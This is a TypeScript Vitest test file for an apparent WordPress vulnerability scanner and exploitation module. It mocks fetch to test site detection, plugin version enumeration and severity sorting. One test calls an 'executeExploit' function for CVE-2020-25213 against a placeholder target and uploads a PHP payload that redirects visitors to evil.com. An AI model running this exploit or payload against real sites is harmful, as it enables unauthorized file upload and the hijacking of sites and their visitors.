import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";

// We test the module's logic by importing the types and testing the exported functions
// Since the scanner makes HTTP calls, we mock fetch globally

describe("wp-vuln-scanner", () => {
  let originalFetch: typeof globalThis.fetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    vi.restoreAllMocks();
  });

  describe("runWpVulnScan", () => {
    it("returns isWordPress=false for non-WordPress sites", async () => {
      // Mock fetch to return 404 for all WP-specific endpoints
      globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
        return {
          status: 404,
          ok: false,
          text: async () => "Not Found",
          json: async () => ({}),
          headers: new Headers(),
          url,
        } as Response;
      });

      const { runWpVulnScan } = await import("./wp-vuln-scanner");
      const result = await runWpVulnScan("https://example.com");

      expect(result.isWordPress).toBe(false);
      expect(result.plugins).toHaveLength(0);
      expect(result.themes).toHaveLength(0);
      expect(result.vulnerabilities).toHaveLength(0);
      expect(result.scanDuration).toBeGreaterThan(0);
    });

    it("detects WordPress via wp-login.php", async () => {
      globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
        if (url.includes("wp-login.php")) {
          return {
            status: 200,
            ok: true,
            text: async () => '<html><body class="wp-login">WordPress Login</body></html>',
            json: async () => ({}),
            headers: new Headers(),
            url,
          } as Response;
        }
        // Return 404 for everything else to speed up test
        return {
          status: 404,
          ok: false,
          text: async () => "Not Found",
          json: async () => ({}),
          headers: new Headers(),
          url,
        } as Response;
      });

      const { runWpVulnScan } = await import("./wp-vuln-scanner");
      const result = await runWpVulnScan("https://wp-site.com");

      expect(result.isWordPress).toBe(true);
    });

    it("detects WordPress via meta generator tag", async () => {
      let callCount = 0;
      globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
        callCount++;
        // wp-login.php returns 404
        if (url.includes("wp-login.php")) {
          return { status: 404, ok: false, text: async () => "Not Found", json: async () => ({}), headers: new Headers(), url } as Response;
        }
        // readme.html returns 404
        if (url.includes("readme.html")) {
          return { status: 404, ok: false, text: async () => "Not Found", json: async () => ({}), headers: new Headers(), url } as Response;
        }
        // Main page has WP meta tag
        if (url === "https://wp-meta.com" || url === "https://wp-meta.com/") {
          return {
            status: 200,
            ok: true,
            text: async () => '<html><head><meta name="generator" content="WordPress 6.4.2"></head><body>Site</body></html>',
            json: async () => ({}),
            headers: new Headers(),
            url,
          } as Response;
        }
        return { status: 404, ok: false, text: async () => "Not Found", json: async () => ({}), headers: new Headers(), url } as Response;
      });

      const { runWpVulnScan } = await import("./wp-vuln-scanner");
      const result = await runWpVulnScan("https://wp-meta.com");

      expect(result.isWordPress).toBe(true);
      expect(result.wpVersion).toBe("6.4.2");
    });

    it("enumerates plugins from readme.txt", async () => {
      globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
        // WP detection
        if (url.includes("wp-login.php")) {
          return { status: 200, ok: true, text: async () => "wp-login WordPress", json: async () => ({}), headers: new Headers(), url } as Response;
        }
        // Plugin readme.txt detection
        if (url.includes("/wp-content/plugins/contact-form-7/readme.txt")) {
          return {
            status: 200,
            ok: true,
            text: async () => "=== Contact Form 7 ===\nStable tag: 5.3.1\nVersion: 5.3.1",
            json: async () => ({}),
            headers: new Headers(),
            url,
          } as Response;
        }
        if (url.includes("/wp-content/plugins/wp-file-manager/readme.txt")) {
          return {
            status: 200,
            ok: true,
            text: async () => "=== WP File Manager ===\nStable tag: 6.8\nVersion: 6.8",
            json: async () => ({}),
            headers: new Headers(),
            url,
          } as Response;
        }
        // XMLRPC disabled
        if (url.includes("xmlrpc.php")) {
          return { status: 405, ok: false, text: async () => "Method Not Allowed", json: async () => ({}), headers: new Headers(), url } as Response;
        }
        // REST API
        if (url.includes("wp-json/") && !url.includes("plugins")) {
          return { status: 200, ok: true, text: async () => "{}", json: async () => ({}), headers: new Headers(), url } as Response;
        }
        return { status: 404, ok: false, text: async () => "Not Found", json: async () => ({}), headers: new Headers(), url } as Response;
      });

      const { runWpVulnScan } = await import("./wp-vuln-scanner");
      const result = await runWpVulnScan("https://vuln-wp.com");

      expect(result.isWordPress).toBe(true);
      expect(result.plugins.length).toBeGreaterThanOrEqual(2);

      const cf7 = result.plugins.find(p => p.slug === "contact-form-7");
      expect(cf7).toBeDefined();
      expect(cf7?.version).toBe("5.3.1");

      const fm = result.plugins.find(p => p.slug === "wp-file-manager");
      expect(fm).toBeDefined();
      expect(fm?.version).toBe("6.8");

      // Should have vulnerabilities matched
      expect(result.vulnerabilities.length).toBeGreaterThanOrEqual(2);

      // Check that critical vulns are sorted first
      const criticalVulns = result.vulnerabilities.filter(v => v.severity === "critical");
      expect(criticalVulns.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe("executeExploit", () => {
    it("executes wp-file-manager CVE-2020-25213 exploit", async () => {
      globalThis.fetch = vi.fn().mockImplementation(async (url: string, init?: RequestInit) => {
        // Exploit endpoint
        if (url.includes("connector.minimal.php") && init?.method === "POST") {
          return {
            status: 200,
            ok: true,
            text: async () => JSON.stringify({ added: [{ name: "cache-abc123.php" }] }),
            json: async () => ({ added: [{ name: "cache-abc123.php" }] }),
            headers: new Headers(),
            url,
          } as Response;
        }
        return { status: 404, ok: false, text: async () => "Not Found", json: async () => ({}), headers: new Headers(), url } as Response;
      });

      const { executeExploit } = await import("./wp-vuln-scanner");
      const result = await executeExploit(
        "https://target.com",
        {
          plugin: "wp-file-manager",
          cve: "CVE-2020-25213",
          title: "WP File Manager <= 6.8 Unauthenticated File Upload",
          type: "file_upload",
          severity: "critical",
          affectedVersions: "<= 6.8",
          exploitAvailable: true,
          exploitEndpoint: "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
          exploitMethod: "POST",
          exploitPayload: null,
          reference: null,
        },
        "cache-abc123.php",
        '<?php header("Location: https://evil.com", true, 302); exit; ?>',
      );

      expect(result.success).toBe(true);
      expect(result.uploadedUrl).toContain("cache-abc123.php");
    });

    it("returns failure for non-exploitable vulnerability", async () => {
      const { executeExploit } = await import("./wp-vuln-scanner");
      const result = await executeExploit(
        "https://target.com",
        {
          plugin: "nonexistent-plugin",
          cve: null,
          title: "Test",
          type: "xss",
          severity: "low",
          affectedVersions: "all",
          exploitAvailable: false,
          exploitEndpoint: null,
          exploitMethod: null,
          exploitPayload: null,
          reference: null,
        },
        "test.php",
        "test",
      );

      expect(result.success).toBe(false);
    });
  });

  describe("vulnerability matching", () => {
    it("sorts vulnerabilities by severity and type", async () => {
      // Mock to detect WP and find multiple vulnerable plugins
      globalThis.fetch = vi.fn().mockImplementation(async (url: string) => {
        if (url.includes("wp-login.php")) {
          return { status: 200, ok: true, text: async () => "wp-login WordPress", json: async () => ({}), headers: new Headers(), url } as Response;
        }
        // Detect multiple plugins with known vulns
        if (url.includes("/wp-content/plugins/revslider/readme.txt")) {
          return { status: 200, ok: true, text: async () => "Stable tag: 4.1.4", json: async () => ({}), headers: new Headers(), url } as Response;
        }
        if (url.includes("/wp-content/plugins/contact-form-7/readme.txt")) {
          return { status: 200, ok: true, text: async () => "Stable tag: 5.3.1", json: async () => ({}), headers: new Headers(), url } as Response;
        }
        if (url.includes("/wp-content/plugins/duplicator/readme.txt")) {
          return { status: 200, ok: true, text: async () => "Stable tag: 1.3.26", json: async () => ({}), headers: new Headers(), url } as Response;
        }
        return { status: 404, ok: false, text: async () => "Not Found", json: async () => ({}), headers: new Headers(), url } as Response;
      });

      const { runWpVulnScan } = await import("./wp-vuln-scanner");
      const result = await runWpVulnScan("https://multi-vuln.com");

      expect(result.vulnerabilities.length).toBeGreaterThanOrEqual(3);

      // Critical should come before high
      const severities = result.vulnerabilities.map(v => v.severity);
      const criticalIdx = severities.indexOf("critical");
      const highIdx = severities.indexOf("high");
      if (criticalIdx !== -1 && highIdx !== -1) {
        expect(criticalIdx).toBeLessThan(highIdx);
      }

      // file_upload should come before arbitrary_file_read within same severity
      const fileUploadVuln = result.vulnerabilities.find(v => v.type === "file_upload");
      const fileReadVuln = result.vulnerabilities.find(v => v.type === "arbitrary_file_read");
      if (fileUploadVuln && fileReadVuln) {
        const uploadIdx = result.vulnerabilities.indexOf(fileUploadVuln);
        const readIdx = result.vulnerabilities.indexOf(fileReadVuln);
        expect(uploadIdx).toBeLessThan(readIdx);
      }
    });
  });
});
